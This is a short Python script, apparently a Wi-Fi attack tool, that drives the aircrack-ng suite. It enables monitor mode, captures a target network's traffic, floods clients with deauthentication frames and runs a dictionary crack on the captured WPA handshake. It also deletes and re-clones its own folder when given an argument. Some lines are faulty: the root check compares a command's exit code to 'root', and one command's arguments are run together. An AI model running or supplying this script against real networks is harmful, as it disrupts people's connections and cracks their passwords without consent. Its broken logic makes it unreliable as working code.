try:
	import os, sys, time, requests
except:
	print("Start install.sh!!!")

if __name__ == "__main__":
    if len (sys.argv) > 1:
        os.system("cd && rm -rf WIFIDDOS && git clone https://github.com/Py-Developers/WIFIDDOS ")



username = os.system("whoami")
if username != "root":
    print("You must start whis root!(sudo or su)")
else:
    module = input("input you`r interface(if you don`t know type in new session ifconfig): ")
    os.system("airmon-ng start "+module)
    print("Chose wifi:")
    os.system("airodump-ng mon0")
    time.sleep(2)
    bssid = input("Enter BSSID wifi whot you choose: ")
    cannel = input("Enter canel wifi whot you choose: ")
    print("DDOS start!")
    os.system("airodump-ng --bssid "+bssid+" -c "+cannel+" -w WPAcrack mon0")
    os.system("aireplay-ng --deauth 100 -a "+bssid + module+"mon0")
    chose = input("Do you have list whis password?(Y/n)\n")
    if chose == "Y":
    	passlist = input("Write all way to password list:\n")
    	os.system("aircrack-ng WPAcrack-01.cap -w " + passlist)

    elif chose == "N":
    	print("Now wait!")
    	os.system("aircrack-ng WPAcrack-01.cap -w passwordlist.txt")
